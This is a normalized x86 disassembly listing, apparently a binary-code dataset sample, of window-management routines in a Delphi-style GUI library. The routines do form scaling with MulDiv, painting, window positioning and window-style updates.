mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xd8 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_473594
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_4031ec
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x240 ]
call sub_4031ec
mov eax [ ebp - 0x4 ]
add eax 0x2f0
call sub_40d538
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_46d8fc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e52d
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xac ]
sub_46e540
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2d2 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x2
je r-xdata
xor eax eax
push ebp
push sub_46e581
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2d4 ]
call [ ebx + 0x2d0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_46eef8
sub_46e586
mov eax [ ebp - 0x4 ]
mov si 0xffad
call sub_4033e8
test al al
jne r-xdata
call sub_403a34
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x2
je r-xdata
call sub_4039e0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_46eef8
sub_46e5bc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2da ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_46e5fd
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2dc ]
call [ ebx + 0x2d8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_46e61c
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_457b08
mov eax [ ebx + 0x220 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi eax
xor eax eax
mov [ ebx + 0x220 ] eax
mov eax edi
mov si 0xffb8
call sub_4033e8
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_4708c4
sub_46e658
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_454f1c
mov eax ebx
sub al 0x1
jb r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
je r-xdata
test [ edi + 0x1c ] 0x1
jne r-xdata
cmp [ edi + 0x2f0 ] 0x0
jne r-xdata
mov ebp [ edi + 0x2f0 ]
test ebp ebp
je r-xdata
jmp r-xdata
cmp [ edi + 0x250 ] 0x0
je r-xdata
cmp [ edi + 0x248 ] 0x0
jne r-xdata
mov edx esi
mov eax [ edi + 0x2f0 ]
call sub_418c68
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov [ edi + 0x2f0 ] eax
cmp esi [ edi + 0x248 ]
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx ebx
mov edx esi
mov eax [ edi + 0x250 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp edi [ esi + 0x4 ]
jne r-xdata
cmp esi [ edi + 0x258 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_46fcbc
mov edx esi
mov eax ebp
call sub_418f60
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
cmp esi [ edi + 0x260 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_46fc94
mov edx esi
mov eax edi
call sub_46fcbc
jmp r-xdata
xor edx edx
mov eax edi
call sub_46fc70
sub_46e764
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_458be0
xor edx edx
push ebp
push sub_46e9ba
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x268 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x26c ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x270 ] edx
xor ebx ebx
mov al [ rw-data ]
xor al 0x1
mov edx [ ebp - 0x4 ]
mov [ edx + 0x234 ] al
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_45833c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x25c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x270 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
test eax eax
jle r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_455468
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ r-xdata ]
mov [ eax + 0x98 ] dl
test bl bl
jne r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_4554ac
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x25c ] eax
mov eax [ ebp - 0x4 ]
call sub_46eaec
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
cmp esi eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x25c ]
mov edx [ rw-data ]
cmp eax [ edx + 0x40 ]
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_456c00
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e9c1
mov eax [ ebp - 0x4 ]
call sub_458be8
retn
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_46ddc4
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_45be0c
mov bl 0x1
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_46ddc4
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x270 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_45be0c
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x25c ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x68 ]
mov eax esi
call sub_424988
push eax
call MulDiv
mov edx eax
mov eax esi
call sub_424990
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x268 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x26c ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fa ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fa ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fe ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fe ] eax
sub_46e9c9
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_459688
push 0x0
push 0x0
push ebx
push sub_46ead0
mov cl [ ebx + 0x5e ]
xor cl 0x1
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push sub_46ea9c
push ebx
push sub_46eab4
mov cl [ ebx + 0x5e ]
xor cl 0x1
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push r-xdata
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
retn
sub_46ea7b
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax esi
call sub_41ca7c
test al al
je r-xdata
pop esi
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_455b78
sub_46eb07
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add bl al
lea eax [ eax ]
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_46ddc4
mov ecx edi
mov edx esi
mov eax ebx
call sub_45be0c
mov eax ebx
call sub_46ebf0
test al al
je r-xdata
push edi
push esi
mov ebp [ ebx + 0x68 ]
mov eax ebp
call sub_424a2c
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_424a48
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_455494
mov ebp eax
push edi
push esi
mov eax ebx
call sub_455450
push eax
call MulDiv
mov edx eax
mov eax ebx
call sub_46ee98
push edi
push esi
push ebp
call MulDiv
mov edx eax
mov eax ebx
call sub_46eec8
sub_46eb94
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax ebx
call sub_45c380
push eax
call IsIconic
test eax eax
je r-xdata
mov eax ebx
call sub_45c684
test al al
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
cmp [ ebx + 0x229 ] 0x3
je r-xdata
mov eax ebx
call sub_470ef4
push eax
push 0x1
push 0x80
mov eax ebx
call sub_45c380
push eax
call SendMessageA
pop ebx
retn
sub_46ec28
push ebx
mov ebx eax
mov eax ebx
call sub_46fb44
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov al [ ebx + 0x229 ]
sub al 0x2
je r-xdata
mov al 0x1
sub al 0x3
je r-xdata
mov al 0x1
pop ebx
retn
xor eax eax
jmp r-xdata
cmp al [ ebx + 0x210 ]
jne r-xdata
sub_46ecbc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_45c380
push eax
call IsIconic
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_45c448
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetRect
push 0xffffffec
mov eax ebx
call sub_45c380
push eax
call GetWindowLongA
push eax
cmp [ ebx + 0x248 ] 0x0
setne al
neg al
sbb eax eax
push eax
push 0xfffffff0
mov eax ebx
call sub_45c380
push eax
call GetWindowLongA
push eax
push esi
call AdjustWindowRectEx
mov eax [ ebx + 0x4c ]
sub eax [ esi + 0xc ]
add eax [ esi + 0x4 ]
push eax
mov eax [ ebx + 0x48 ]
sub eax [ esi + 0x8 ]
add eax [ esi ]
push eax
push 0x0
push 0x0
push esi
call SetRect
pop esi
pop ebx
retn
sub_46ed44
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx esi
mov eax ebx
call sub_45c8e0
cmp ebx esi
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
mov eax ebx
call sub_421910
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov edx edi
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4218e4
mov edi eax
mov eax edi
mov si 0xfff1
call sub_4033e8
test al al
jne r-xdata
sub_46edb0
push ebx
push esi
mov ebx eax
cmp [ ebx + 0xa0 ] 0x0
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov esi eax
mov eax ebx
call sub_403134
cmp esi eax
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_46eddc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov eax [ esp ]
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov eax ebp
call sub_459078
sub [ esp + 0x4 ] eax
mov [ esp + 0x8 ] 0xffffffff
mov eax ebp
call sub_421910
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebp
call sub_45c928
jmp r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
inc [ esp + 0x8 ]
mov eax [ esp + 0x8 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
mov edx edi
mov eax ebp
call sub_4218e4
mov si 0xfff1
call sub_4033e8
test al al
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_421920
jmp r-xdata
sub_46ee70
push ebx
mov ebx eax
cmp dl [ ebx + 0x60 ]
je r-xdata
pop ebx
retn
mov eax ebx
call sub_455c34
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_456c00
sub_46ee98
push ebx
mov ebx eax
test [ ebx + 0x54 ] 0x8
je r-xdata
mov eax ebx
call sub_455468
pop ebx
retn
mov [ ebx + 0x268 ] edx
mov al [ r-xdata ]
or al [ ebx + 0x98 ]
mov [ ebx + 0x98 ] al
pop ebx
retn
sub_46eec8
push ebx
mov ebx eax
test [ ebx + 0x54 ] 0x8
je r-xdata
mov eax ebx
call sub_4554ac
pop ebx
retn
mov [ ebx + 0x26c ] edx
mov al [ r-xdata ]
or al [ ebx + 0x98 ]
mov [ ebx + 0x98 ] al
pop ebx
retn
sub_46eef8
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi + 0x2f4 ] 0x1
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx ebx
mov eax esi
call sub_45596c
cmp bl [ esi + 0x57 ]
je r-xdata
and [ esi + 0x2f4 ] 0xfd
pop esi
pop ebx
retn
or [ esi + 0x2f4 ] 0x2
jmp r-xdata
mov eax esi
call sub_470030
pop esi
pop ebx
retn
sub_46ef3c
push ebp
mov ebp esp
push 0x0
xor edx edx
push ebp
push sub_46ef95
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ef9c
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
cmp [ eax + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d64
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb0c
call sub_4039b8
sub_46efa4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
cmp ebx esi
je r-xdata
test eax eax
jne r-xdata
mov edx esi
mov eax ebx
call sub_455920
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax ebx
call sub_4598a0
mov eax ebx
call sub_459a3c
sub_46efdc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_42175c
cmp [ ebx + 0x250 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax [ ebx + 0x250 ]
mov ebx [ eax ]
call [ ebx + 0x2c ]
sub_46f01c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
mov edx eax
cmp edx 0x46
jg r-xdata
sub edx 0xb01a
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
dec edx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x1c ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
add edx 0xfffffffa
sub edx 0x3
jb r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_459d5c
mov eax [ ebp - 0x4 ]
mov si 0xffb3
call sub_4033e8
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
dec eax
sub al 0x2
jae r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub edx 0x22
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffb1
call sub_4033e8
jmp r-xdata
cmp eax [ rw-data ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
sub al 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx ] 0x7
jne r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp [ eax ] 0x1
jne r-xdata
dec edx
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb025
mov eax [ ebp - 0x4 ]
call sub_456c00
push 0x0
xor ecx ecx
mov edx 0xb024
mov eax [ ebp - 0x4 ]
call sub_456c00
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax [ ebp - 0x4 ]
call sub_456c00
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax [ ebp - 0x4 ]
call sub_456c00
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax [ ebp - 0x4 ]
call sub_456c00
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_456c00
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x229 ]
sub al 0x2
je r-xdata
sub al 0x2
jne r-xdata
mov eax [ ebx + 0x8 ]
or [ eax + 0x18 ] 0x2
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov esi [ ebx + 0x8 ]
cmp [ esi ] 0x1
jne r-xdata
jmp r-xdata
mov eax [ ebx + 0x8 ]
or [ eax + 0x18 ] 0x1
jmp r-xdata
sub al 0x3
jne r-xdata
xor esi esi
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
xor ecx ecx
call sub_46907c
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_46f948
test eax eax
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4250c4
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_46f295
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_46f278
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0xc ]
call sub_4257b8
mov eax [ rw-data ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0xc ]
call sub_425658
mov eax [ ebp - 0x14 ]
mov ax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0xc ]
mov eax edi
call sub_46a60c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f27f
xor edx edx
mov eax [ ebp - 0xc ]
call sub_4257b8
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
mov edx [ esi + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
xor ecx ecx
call sub_46907c
mov edi eax
test edi edi
je r-xdata
test esi esi
je r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_46f948
call sub_45c380
mov esi eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_45c380
push eax
call GetWindowDC
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_46f3c3
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4250c4
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_46f39c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_46f37f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_4257b8
mov eax [ rw-data ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0xc ]
call sub_425658
lea eax [ esi + 0x10 ]
push eax
lea ecx [ esi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f386
xor edx edx
mov eax [ ebp - 0xc ]
call sub_4257b8
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call RestoreDC
retn
push esi
call SetFocus
jmp r-xdata
call sub_45c380
mov esi eax
sub_46f3a3
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_45c380
push eax
call ReleaseDC
retn
sub_46f454
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x274 ]
push eax
call CallWindowProcA
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_46f4a0
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_46f97c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_46f9c8
cmp [ eax + 0x22b ] 0x2
jne r-xdata
pop esi
pop ebx
pop ebp
retn
sub_46f4e0
push ebp
mov ebp esp
add esp 0xffffff8c
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
sub eax 0xf
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
sub eax 0x5
je r-xdata
xor eax eax
push ebp
push sub_46f6ae
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call BeginPaint
mov edx [ ebp - 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_424fa8
push eax
lea edx [ ebp - 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x6c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call FillRect
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
sub eax 0x2b
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_459ffc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call GetWindowRect
lea ecx [ ebp - 0x74 ]
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_455590
mov eax [ ebp - 0x74 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp - 0x70 ]
mov [ ebp - 0x58 ] eax
mov ecx [ ebp - 0x58 ]
neg ecx
mov edx [ ebp - 0x5c ]
neg edx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_454388
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
push ebp
call sub_46f454
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
sub eax 0x45
jne r-xdata
retn
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call EndPaint
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call GetClientRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_424fa8
push eax
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call FillRect
mov eax [ ebp - 0x4 ]
call sub_46f97c
test eax eax
je r-xdata
push ebp
call sub_46f454
pop ecx
push ebp
call sub_46f454
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
mov dl 0x1
push ebp
call sub_46f4a0
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0xffffffff
jmp r-xdata
xor edx edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
call sub_46c7a4
jmp r-xdata
sub_46f6c0
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov ebx eax
mov ecx esi
mov eax ebx
call sub_46d988
mov eax [ ebx + 0x254 ]
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x14
mov ecx [ esi + 0xc ]
mov edi [ esi + 0x4 ]
sub ecx edi
push ecx
mov ecx [ esi + 0x8 ]
mov edx [ esi ]
sub ecx edx
push ecx
push edi
push edx
push 0x1
push eax
call SetWindowPos
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
push esp
mov eax [ ebx + 0x254 ]
push eax
call GetClientRect
test eax eax
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebx + 0x254 ]
push eax
call InvalidateRect
sub_46f72c
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax ebx
call sub_46e024
mov eax ebx
call sub_45c684
test al al
je r-xdata
mov eax ebx
call sub_421910
mov edi eax
dec edi
test edi edi
jl r-xdata
push 0xffffffec
mov eax ebx
call sub_45c380
push eax
call GetWindowLongA
and eax 0xffffefff
and eax 0xffffdfff
and eax 0xffffbfff
mov [ esp ] eax
mov edx esp
mov eax ebx
call sub_45916c
mov eax [ esp ]
push eax
push 0xffffffec
mov eax ebx
call sub_45c380
push eax
call SetWindowLongA
pop edx
pop edi
pop esi
pop ebx
retn
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_4218e4
call sub_469bc0
mov edx esi
mov eax ebx
call sub_4218e4
mov edx [ r-xdata ]
call sub_403378
test al al
